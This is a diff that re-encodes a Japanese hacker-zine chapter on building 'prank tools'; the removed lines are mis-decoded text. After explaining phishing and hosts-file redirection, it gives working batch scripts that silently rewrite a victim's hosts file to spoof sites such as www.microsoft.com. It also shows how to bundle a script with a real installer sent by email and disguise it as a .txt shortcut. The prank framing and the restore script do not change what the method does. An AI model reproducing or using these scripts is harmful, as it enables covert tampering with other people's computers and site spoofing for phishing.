@@ -1,56 +1,56 @@
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
---- ��4��: ���Y�c�[���̍��� ---
+--- 第4章: 悪戯ツールの作り方 ---
 
-���ҁFPSY
+著者：PSY
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
 
-��0x01.) �v�����[�O
+■0x01.) プロローグ
 
-�@�́A�C�O�̃n�b�J�[�O���[�v���A�}�X�R�~�����炩���ėV�񂾂����ł��B�u��
-�̃T�C�g�A�n�N���������v�Ƃ������Ȃ���A�����̍�����U�T�C�g���s�����藈
-����BURL������΂����������ƂɋC�Â����͂��ł����A�����̃}�X�R�~�͂܂��
-���S�ҁB�ŏI�I�ɁA�p�\�R���ɏڂ����l�����ԂɋC�Â��A���̉f���͕��f�����
-�����������ł����A�Ȃ��Ȃ��ʔ����b���Ǝv���܂����B
-�@������pWEB�u���E�U���������ǂ����낤�H�@URL�̗������R�ɐݒ�ł����
-���ɂ�����A���T�C�g���n�b�N�����悤�Ɍ��������āA�F�B���r�b�N��������
-���Ƃ����ĊȒP�ɂł��邶��Ȃ����A�ƁB
-�@���́A�u���E�U�����K�v�͂���܂���ł����B�����ƊȒP�ȕ��@�ŁA�F�B��
-�r�b�N�������邱�Ƃ��ł���̂ł��B�ŋ߃t�B�b�V���O���\�Ȃǂł����������
-���g���Ă��邻���Ȃ̂ŁA�܂��̓t�B�b�V���O���\�ɂ��ĉ�����Ă݂悤��
-�v���܂��B
+　昔、海外のハッカーグループが、マスコミをからかって遊んだそうです。「こ
+のサイト、ハクったぜぃ」とかいいながら、自分の作った偽サイトを行ったり来
+たり。URLを見ればおかしいことに気づいたはずですが、当時のマスコミはまるで
+初心者。最終的に、パソコンに詳しい人が事態に気づき、この映像は放映されな
+かったそうですが、なかなか面白い話だと思いました。
+　自分専用WEBブラウザを作ったらどうだろう？　URLの欄を自由に設定できるよ
+うにしたら、大手サイトをハックしたように見せかけて、友達をビックリさせる
+ことだって簡単にできるじゃないか、と。
+　実は、ブラウザを作る必要はありませんでした。もっと簡単な方法で、友達を
+ビックリさせることができるのです。最近フィッシング詐欺などでそうした手口
+が使われているそうなので、まずはフィッシング詐欺について解説してみようと
+思います。
 
 
-��0x01.) �t�B�b�V���O���\�̎d�g��
+■0x01.) フィッシング詐欺の仕組み
 
-�@���̂Ƃ���ɁA���߂č��\���[���������̂́A�m�����Ȃ�̂̂��ƁB�V�e�B�o
-���N����̉p��̃��[���ł����B�uID�ƃp�X���[�h���R���������̂ŁA�V�����p
-�X���[�h��ݒ肵�Ăق����v�Ƃ���AURL���L����Ă��܂����B�V�e�B�o���N�Ȃ�
-�Ɍ����͎����Ă��Ȃ��̂ŁA����͉������B
-�@URL�̏�ɃJ�[�\���������Ă����ƁA�Ă̒胁�[����\������Ă���̂ƈႤU
-RL�����̃o�[�ɕ\������܂����B����͂������\���ƍ������Ă���悤�Ȃ����
-���B�����A�u����Ȃ̂Ɉ��������郄�c����̂��ȁ[�v�Ǝv�������̂ł��B
-�@����Ȃ̂Ɉ���������悤�ł́A�T�C�g�������Ă���l�Ȃ�N�ł����\���ł�
-�Ă��܂��c�c�Ǝv���Ă�����A�Ă̒�A���ꂩ�班�������āA���{�ɂ��}�l����
-���\���㗤���Ă��܂����B
-�@�Ƃ͂����AID�ƃp�X���[�h���킩���������ł͂ǂ����悤������܂���B�ˋ�
-�����A�U���`�ŗp�ӂ���WEB�T�C�g�c�c�ƁA�����͑�ρB�o���Ȃ������ɂ�������
-�낵�ɍs���̂����J�ł��B�܂��l���Ⴠ���ł��傤����A�����Ă��͑g�D�I
-�ƍ߂ł��傤�B
-�@���A���������΁AYahoo�̋U�T�C�g������Ė��ɂȂ��Ă��l�����܂��������B
-��ʐl���w�^�Ɉ������ƂɎ���o���ƁA�낭�Ȃ��ƂɂȂ�܂���B
+　私のところに、初めて詐欺メールが来たのは、確かかなり昔のこと。シティバ
+ンクからの英語のメールでした。「IDとパスワードが漏えいしたので、新しいパ
+スワードを設定してほしい」とあり、URLが記されていました。シティバンクなぞ
+に口座は持っていないので、これは怪しい。
+　URLの上にカーソルを持っていくと、案の定メール上表示されているのと違うU
+RLが下のバーに表示されました。これはもう詐欺だと告白しているようなもんで
+す。正直、「こんなのに引っかかるヤツいるのかなー」と思ったものです。
+　こんなのに引っかかるようでは、サイトを持っている人なら誰でも詐欺ができ
+てしまう……と思っていたら、案の定、それから少したって、日本にもマネっこ
+詐欺が上陸してきました。
+　とはいえ、IDとパスワードがわかっただけではどうしようもありません。架空
+口座、偽名義で用意したWEBサイト……と、準備は大変。バレないうちにお金を下
+ろしに行くのも一苦労です。まあ個人じゃムリでしょうから、たいていは組織的
+犯罪でしょう。
+　あ、そういえば、Yahooの偽サイトを作って問題になってた人がいましたっけ。
+一般人がヘタに悪いことに手を出すと、ろくなことになりません。
 
-�@�t�B�b�V���O���\�����񂾂�肪����ł��āA�{�ƂƎ����h���C�����������
-���Ă��܂��B
-�@����ɂ����̈������ƂɁA���̃X�e�[�^�X�o�[�ɕ\�������URL���U�������
-�����肵�܂��B���Ƃ��΁A���̕�����؂����ăe�L�X�g�G�f�B�^�ɓ\����A
-test.html�Ȃǂ̖��O�ŕۑ����Ă݂Ă��������B
+　フィッシング詐欺もだんだん手が込んできて、本家と似たドメインを取ったり
+しています。
+　さらにたちの悪いことに、下のステータスバーに表示されるURLも偽装されて
+いたりします。たとえば、次の部分を切り取ってテキストエディタに貼りつけ、
+test.htmlなどの名前で保存してみてください。
 
------�@test.html
+-----　test.html
 <html><body>
 <a href="http://yahoo.co.jp">
 <table><tr><td>
@@ -62,80 +62,80 @@ http://yahoo.co.jp
 </body></html>
 -----
 
-�@IE6�Ńt�@�C�����J���A�����N��́uhttp://yahoo.co.jp�v�̕����̏�փJ�[�\
-���������Ă����ƁA�X�e�[�^�X�o�[�ɂ͂����Ɓuhttp://yahoo.co.jp�v�ƕ\��
-����邱�Ƃł��傤�B�Ƃ��낪�A�N���b�N���Ă݂�ƁA�o�Ă���̂�Security A
-kademeia�̃y�[�W�ł��B
+　IE6でファイルを開き、リンク先の「http://yahoo.co.jp」の文字の上へカーソ
+ルを持っていくと、ステータスバーにはちゃんと「http://yahoo.co.jp」と表示
+されることでしょう。ところが、クリックしてみると、出てくるのはSecurity A
+kademeiaのページです。
 
-�@���̃P�[�X�ł��A�N���b�N�������URL������΁A�ǂ��̃T�C�g���킩��܂��B
-����ł́A�W�����v���URL��������΁A�K���U�T�C�g�����������邩����S�c
-�c���Ƃ����ƁA�����ł��Ȃ��̂ł��B
+　このケースでも、クリックした後のURLを見れば、どこのサイトかわかります。
+それでは、ジャンプ先のURL欄を見れば、必ず偽サイトを見分けられるから安心…
+…かというと、そうでもないのです。
 
-�@�u���E�U��URL��ł����ނƁA�h���C���̕�����PC������IP�A�h���X�ɕϊ�����
-�Ă���A�����WEB�T�[�o�ɐڑ�����܂��B���̕ϊ����s���Ă���̂����]���o��
-�����v���O�����ł��B���]���o�́A�h���C����IP�A�h���X�̑Ή��Â���m�邽��
-�ɁADNS�T�[�o�\�\�h���C���E�l�[���E�V�X�e���T�[�o�ɖ⍇�������܂��B
-�@�Ƃ��낪�A����t�@�C���ɐݒ肳�ꂽ�h���C���ɂ��ẮADNS�T�[�o�ɖ⍇��
-���ɒ���IP�A�h���X�ɕϊ������̂ł��B�����Ŏg����̂�hosts�t�@�C���ł��B
-�@�ł́A������PC��hosts�t�@�C����T���Ă݂܂��傤�BOS���Ƃ�hosts�t�@�C��
-�͉��L�̃t�H���_�ɓ����Ă��܂��B
+　ブラウザにURLを打ち込むと、ドメインの部分がPC内部でIPアドレスに変換され
+てから、相手のWEBサーバに接続されます。この変換を行っているのがリゾルバと
+いうプログラムです。リゾルバは、ドメインとIPアドレスの対応づけを知るため
+に、DNSサーバ——ドメイン・ネーム・システムサーバに問合せをします。
+　ところが、あるファイルに設定されたドメインについては、DNSサーバに問合せ
+ずに直接IPアドレスに変換されるのです。ここで使われるのがhostsファイルです。
+　では、自分のPCでhostsファイルを探してみましょう。OSごとのhostsファイル
+は下記のフォルダに入っています。
 
-�@�@Windwos9x/Me �h���C�u��:Windows\hosts 
-�@�@WindowsNT/2000 �h���C�u��:\WINNT\system32\drivers\etc\hosts 
-�@�@WindowsXP �h���C�u��:\WINDOWS\system32\drivers\etc\hosts 
+　　Windwos9x/Me ドライブ名:Windows\hosts 
+　　WindowsNT/2000 ドライブ名:\WINNT\system32\drivers\etc\hosts 
+　　WindowsXP ドライブ名:\WINDOWS\system32\drivers\etc\hosts 
 
-�@������Ȃ����́A�t�H���_�I�v�V�����Łu�B���t�@�C����\�����Ȃ��v�̐�
-����A�u���ׂẴt�@�C���ƃt�H���_��\������v�ɕύX���邱�ƁB�u�o�^����
-�Ă���g���q�͕\�����Ȃ��v�̃`�F�b�N���O���Ă����܂��傤�B
+　見つからない方は、フォルダオプションで「隠しファイルを表示しない」の設
+定を、「すべてのファイルとフォルダを表示する」に変更すること。「登録され
+ている拡張子は表示しない」のチェックも外しておきましょう。
 
-�@hosts�t�@�C��������������A�e�L�X�g�G�f�B�^�ŊJ���āA��ԉ��Ɏ��̈�s
-�����������A�㏑���ۑ����Ă݂Ă��������B
+　hostsファイルが見つかったら、テキストエディタで開いて、一番下に次の一行
+を書き加え、上書き保存してみてください。
 
 -----
 66.249.89.99 www.yahoo.co.jp
 -----
 
-�@�G�f�B�^�ɂ���āA.txt�̊g���q�����Ă��܂����Ƃ�����̂ŁA�m�F���Ă�
-���܂��傤�B���Ă����ꍇ�͍���Ă����܂��B���̌�A�u���E�U��http://www
-.yahoo.co.jp�����Ă݂�Ɓc�c���āA�ǂ��ɂȂ������ł��傤�H
+　エディタによって、.txtの拡張子がついてしまうことがあるので、確認してお
+きましょう。ついていた場合は削っておきます。その後、ブラウザでhttp://www
+.yahoo.co.jpを見てみると……さて、どこにつながったでしょう？
 
-�@�ȏォ��킩��悤�ɁAhosts�t�@�C���Ɏ��̂悤�ȏ����ŏ����Ă����ƁA�E��
-�h���C���ւ��A����IP�A�h���X�ɕϊ������d�g�݂ɂȂ��Ă��܂��B
+　以上からわかるように、hostsファイルに次のような書式で書いておくと、右の
+ドメインへが、左のIPアドレスに変換される仕組みになっています。
 
 -----
-IP�A�h���X �h���C�����i�z�X�g���j
+IPアドレス ドメイン名（ホスト名）
 -----
 
-�@�X�p�C�E�F�A�ȂǂŎ��O�ɂ�����d���܂�Ă���΁A�u���E�U�ɕ\������Ă�
-��̂Ƃ͂܂������Ⴄ�T�C�g�ɐڑ�����Ă��܂��킯�ł��B
+　スパイウェアなどで事前にこれを仕込まれていれば、ブラウザに表示されてい
+るのとはまったく違うサイトに接続されてしまうわけです。
 
 
-��0x03.) ���Y�c�[��������Ă݂悤
+■0x03.) 悪戯ツールを作ってみよう
 
-�@�₯�ɒ��������I���I
-�@�ł͂���ŁA�ǂ�Ȉ��Y���ł��邩�l���Ă݂܂��傤�B
-�@��Ԗʔ����͎̂��O�ŃT�[�o�[�𗧂��グ�邱�Ƃł��ˁB�t���[�E�F�A���o��
-���܂��̂ŁA�u���[�h�o���h���ł���ΈĊO�ȒP�ł��BIP�A�h���X��������PC
-�̃A�h���X�ɂ��Ă����āA�F�B�ɁuYahoo�̃T�C�g���n�b�N�����[�I�v�Ƌ�������
-�݂���A�V���̃T�C�g���R�s�[���āu���Ȃ����V���ɍڂ�����I�v�Ƃ��܂��Ă�
-����c�c�B�n���E�B����Trick�ɂ����Ă����i�H�j�ȉ��o���ł��܂��B
-�@�c�O�Ȃ��烌���^���T�[�o�[��WEB�X�y�[�X�ɂ͔�΂��܂��񂪁A�m�l�̃T�C�g
-��ʂ̃T�C�g�ɔ�΂��A�u�N�̃T�C�g�������Ȃ��ƂɂȂ��Ă��I�v�Ƌ�������
-�Ƃ͂ł��邩������܂���B
+　やけに長い説明終わり！
+　ではこれで、どんな悪戯ができるか考えてみましょう。
+　一番面白いのは自前でサーバーを立ち上げることですね。フリーウェアも出て
+いますので、ブロードバンド環境であれば案外簡単です。IPアドレスを自分のPC
+のアドレスにしておいて、友達に「Yahooのサイトをハックしたゼ！」と驚かして
+みたり、新聞のサイトをコピーして「こないだ新聞に載ったよ！」とだましてみ
+たり……。ハロウィンのTrickにもってこい（？）な演出ができます。
+　残念ながらレンタルサーバーのWEBスペースには飛ばせませんが、知人のサイト
+を別のサイトに飛ばし、「君のサイトおかしなことになってるよ！」と驚かすこ
+とはできるかもしれません。
 
-�@�c�ƁA�����ȃl�^���l������킯�ł����A������PC�Ō�����Ȃ�Ƃ������A
-���肪�����ɂ���ꍇ�Ahosts�t�@�C���𒼐ڂ�����킯�ɂ������Ȃ��ł��傤�B
-�����ŁAhosts�t�@�C��������������c�[��������Ă݂܂��B�Ƃ����Ă��A���s�t
-�@�C�������͖̂ʓ|�Ȃ̂ŁA�ȒP�Ƀe�L�X�g�G�f�B�^�Ńo�b�`�t�@�C�����쐬
-���܂��B
-�@�o�b�`�t�@�C�����N���b�N�����邽�߂ɁA�ʔ����t���[�E�F�A���Ȃɂ��p�ӂ��Ă����܂��傤�B���̃\�t�g�̃C���X�g�[���̊g���q���A���̂悤�ɏ��������Ă����܂��B
+　…と、いろんなネタが考えられるわけですが、自分のPCで見せるならともかく、
+相手が遠くにいる場合、hostsファイルを直接いじるわけにもいかないでしょう。
+そこで、hostsファイルを書き換えるツールを作ってみます。といっても、実行フ
+ァイルを作るのは面倒なので、簡単にテキストエディタでバッチファイルを作成
+します。
+　バッチファイルをクリックさせるために、面白いフリーウェアかなにか用意しておきましょう。このソフトのインストーラの拡張子を、次のように書き換えておきます。
 
-setup.exe��setup._
+setup.exe→setup._
 
-�@���ꂩ��A���̖��߂��e�L�X�g�G�f�B�^�ɒ�����āAinstall.bat�Ȃǂ̖��O
-�ŕۑ����܂��B
+　それから、次の命令をテキストエディタに張りつけて、install.batなどの名前
+で保存します。
 
------�@Windows 2000/NT/XP�̏ꍇ
+-----　Windows 2000/NT/XPの場合
 if exist %windir%\system32\drivers\etc\hosts.bkup goto end
  ren %windir%\system32\drivers\etc\hosts hosts.bkup
  echo 210.171.226.47 www.microsoft.com>> %windir%\system32\drivers\etc\hosts
@@ -143,7 +143,7 @@ if exist %windir%\system32\drivers\etc\hosts.bkup goto end
 setup._
 -----
 
------�@Windows 9x/Me�̏ꍇ
+-----　Windows 9x/Meの場合
 if exist %windir%\hosts.bkup goto end
  ren %windir%\hosts hosts.bkup
  echo 210.171.226.47 www.microsoft.com>> %windir%\hosts
@@ -151,103 +151,103 @@ if exist %windir%\hosts.bkup goto end
 setup._
 -----
 
-�@���̃o�b�`�t�@�C���̒��g���ȒP�ɐ�������ƁA�ȉ��̂悤�ɂȂ��Ă��܂��B
+　このバッチファイルの中身を簡単に説明すると、以下のようになっています。
 
-1�s�ځF���Ƀo�b�N�A�b�v�t�@�C��������΁A���������s���Ȃ��B
-2�s�ځF������hosts�t�@�C����hosts.bkup�Ƀ��l�[������B
-3�s�ځFhosts�t�@�C���ɐݒ���������ށi�D���ȑg�ݍ��킹�ɕς��Ă��������j�B
-4�s�ځF���x���B
-5�s�ځF�{����setup�t�@�C�������s����B
+1行目：既にバックアップファイルがあれば、処理を実行しない。
+2行目：今あるhostsファイルをhosts.bkupにリネームする。
+3行目：hostsファイルに設定を書き込む（好きな組み合わせに変えてください）。
+4行目：ラベル。
+5行目：本物のsetupファイルを実行する。
 
-�@���s�t�@�C���͊g���q������Ă����s����Ă��܂��c�c�Ƃ����̂��~�\�ł��B
-�@������\�t�g�ƈꏏ�Ɉ��k���āA���[���ɓY�t�B�{���ɂ́A�u�ʔ����t���[�E
-�F�A��������Binstall.bat���N���b�N���Ăˁv�ȂǂƏ����Ă����΂�낵���B
-�F�l���\�t�g���C���X�g�[�������̂��m�F��A���[���ŁA�u���̃T�C�g���Ă݂�
-�I�v�Ƒ��T�C�g��URL�𒣂���đ���΁A�т����肷�邱�ƊԈႢ�Ȃ��ł��B
-�U���������T�C�g��IP�A�h���X���A�����̃T�C�g�łȂ��ꍇ�́A�R�}���h�v����
-�v�g�̉�ʂ���ȉ��̂悤��PING��ł��Ē��ׂĂ��������A
+　実行ファイルは拡張子が違っても実行されてしまう……というのがミソです。
+　これをソフトと一緒に圧縮して、メールに添付。本文には、「面白いフリーウ
+ェア見つけたよ。install.batをクリックしてね」などと書いておけばよろしい。
+友人がソフトをインストールしたのを確認後、メールで、「このサイト見てみて
+！」と大手サイトのURLを張りつけて送れば、びっくりすること間違いなしです。
+誘導したいサイトのIPアドレスが、自分のサイトでない場合は、コマンドプロン
+プトの画面から以下のようにPINGを打って調べてもいいし、
 
 -----
-ping �h���C����
+ping ドメイン名
 -----
 
-�@PING���֎~����Ă���T�C�g�Ȃ�AWEB�T�C�g�̕ϊ��T�[�r�X�𗘗p���Ă��\��
-�܂���B"lookup"�Ƃ����L�[���[�h�Ō�������΁A�����������������͂��ł��B
+　PINGが禁止されているサイトなら、WEBサイトの変換サービスを利用しても構い
+ません。"lookup"というキーワードで検索すれば、たくさん引っかかるはずです。
 
 
-��0x04.) �t�@�C�����U�����Ă݂悤
+■0x04.) ファイルを偽装してみよう
 
-�@���ꂾ���ł��悢�̂ł����A�p�S�[���F�B���ƁA���s�O�Ƀo�b�`�t�@�C���̒�
-�g���m���߂邩������܂���B�o�b�`�t�@�C���́A�e�L�X�g�G�f�B�^�ŊJ���΁A
-�ȒP�ɒ��g�������Ă��܂��܂��B
-�@�����ŁA�o�b�`�t�@�C�����e�L�X�g�t�@�C���ɋU��������@�����Љ�܂��B
+　これだけでもよいのですが、用心深い友達だと、実行前にバッチファイルの中
+身を確かめるかもしれません。バッチファイルは、テキストエディタで開けば、
+簡単に中身が見えてしまいます。
+　そこで、バッチファイルをテキストファイルに偽装する方法をご紹介します。
 
-1�F�܂��e�L�X�g�t�@�C����p�ӂ��܂��B�\�t�g�̎g�p���@�A�C���X�g�[�����@�A
-�V���A���ԍ��A�Ȃ�ł��\���܂���B�e�L�X�g�G�f�B�^�ŊJ����Ȃ��悤�A�g��
-�q�Ȃ��̖��O�i�����ł�"info"�Ƃ���j�ŕۑ����܂��B
+1：まずテキストファイルを用意します。ソフトの使用方法、インストール方法、
+シリアル番号、なんでも構いません。テキストエディタで開かれないよう、拡張
+子なしの名前（ここでは"info"とする）で保存します。
 
-2�F�������̃o�b�`�t�@�C���̍Ō��1�s���A���̂悤�ɏ��������܂��B
+2：さっきのバッチファイルの最後の1行を、次のように書き換えます。
 
 -----
 %windir%\notepad.exe info
 -----
 
-3�F�o�b�`�t�@�C�����E�N���b�N���āA�u�V���[�g�J�b�g�̍쐬�v�ŃV���[�g�J�b
-�g���쐬���܂��B
+3：バッチファイルを右クリックして、「ショートカットの作成」でショートカッ
+トを作成します。
 
-4�F�V���[�g�J�b�g�̖��O���u�ŏ��ɓǂ�ł�.txt�v�ȂǂɕύX���܂��B
+4：ショートカットの名前を「最初に読んでね.txt」などに変更します。
 
-5�F�t�@�C���̃v���p�e�B���J���A�u�V���[�g�J�b�g�v�^�u�ŃA�C�R�����e�L�X�g
-�t�@�C���̂��̂ɕύX���܂��B
+5：ファイルのプロパティを開き、「ショートカット」タブでアイコンをテキスト
+ファイルのものに変更します。
 
-�@��������ƁA�o�b�`�t�@�C���ւ̃V���[�g�J�b�g���ꌩ�e�L�X�g�t�@�C���Ɍ�
-���܂��B���A�_�u���N���b�N����ƃo�b�`�t�@�C�������s����܂��B�R�}���h�v
-�����v�g�̉�ʂ��J���Ă��܂��܂����A��u�ŏ����ăm�[�g�p�b�h�Ńe�L�X�g�t
-�@�C�����J�����̂ŁA�ڂ��肵�Ă���ƋC�Â��Ȃ��ł��傤�B
+　こうすると、バッチファイルへのショートカットが一見テキストファイルに見
+えます。が、ダブルクリックするとバッチファイルが実行されます。コマンドプ
+ロンプトの画面が開いてしまいますが、一瞬で消えてノートパッドでテキストフ
+ァイルが開かれるので、ぼんやりしていると気づかないでしょう。
 
 
-��0x05.) ���ɖ߂����@
+■0x05.) 元に戻す方法
 
-�@����ŏI��c�c�ł͂���܂���B���Y������́A�����ƌ��ɖ߂��Ă����܂�
-�傤�B
-�@�������̃o�b�`�Ńo�b�N�A�b�v�t�@�C���ihosts.bkup�j������Ă��邽�߁A��
-���ł��߂��܂����A�ǂ����Ȃ�C���p�̃o�b�`�t�@�C���𑗂��Ă�����̂��e��
-�Ƃ������̂ł��B
-�@���ɖ߂��o�b�`�̒��g�͎��̂悤�ɂȂ�܂��B
+　これで終り……ではありません。悪戯した後は、ちゃんと元に戻してあげまし
+ょう。
+　さっきのバッチでバックアップファイル（hosts.bkup）を作ってあるため、手
+動でも戻せますが、どうせなら修正用のバッチファイルを送ってあげるのが親切
+というものです。
+　元に戻すバッチの中身は次のようになります。
 
------�@Windows 2000/NT/XP�̏ꍇ
+-----　Windows 2000/NT/XPの場合
 if not exist %windir%\system32\drivers\etc\hosts.bkup goto end
  del %windir%\system32\drivers\etc\hosts
  ren %windir%\system32\drivers\etc\hosts.bkup hosts
- echo �������̂̓W���[�N�ł����B���߂�ˁB> sorry
+ echo さっきのはジョークでした。ごめんね。> sorry
  %windir%\notepad.exe sorry
  del sorry
 :end
 -----
 
------�@Windows9x/Me�̏ꍇ
+-----　Windows9x/Meの場合
 if not exist %windir%\hosts.bkup goto end
  del %windir%\hosts
  ren %windir%\hosts.bkup hosts
- echo �������̂̓W���[�N�ł����B���߂�ˁB> sorry
+ echo さっきのはジョークでした。ごめんね。> sorry
  %windir%\notepad.exe sorry
  del sorry
 :end
 -----
 
-�@�Ӎ߂̌��t������Ă݂܂����B�W���[�N�̕�����F�B�Ȃ�A����ŗF��Ƀq�r
-�͓���Ȃ��͂��H
-�@�F�B�͑�؂ɁI
+　謝罪の言葉も入れてみました。ジョークの分かる友達なら、これで友情にヒビ
+は入らないはず？
+　友達は大切に！
 
 
-��0x05.) �G�s���[�O
+■0x05.) エピローグ
 
-�@�������ł����ł��傤���H
-�@�X�p�C�E�F�A��E�C���X�Ȃǂł悭�g���Ă����e�N�j�b�N�Ȃ̂ŁA����Ȃ�
-�ƁA�Ƃ����̐̂ɒm���Ă��I�@�Ǝv��ꂽ���������邩������܂���B����
-���A�܂��g����Z�ł͂���܂��B
-�@�o�b�`�t�@�C�������ɂ��낢��Ɖ��p�������܂����A���ꂮ��������𓭂���
-��A�t�B�b�V���O���\�Ɏg�����ȂǂƎv��Ȃ��悤�ɁB
-�@�߂܂��Ă��m��܂���[�Bhehehe�B
+　いかがでしたでしょうか？
+　スパイウェアやウイルスなどでよく使われていたテクニックなので、こんなこ
+と、とっくの昔に知ってるよ！　と思われた方もおられるかもしれません。しか
+し、まだ使える技ではあります。
+　バッチファイルだけにいろいろと応用が利きますが、くれぐれも悪事を働いた
+り、フィッシング詐欺に使おうなどと思わないように。
+　捕まっても知りませんゼ。hehehe。
 
 
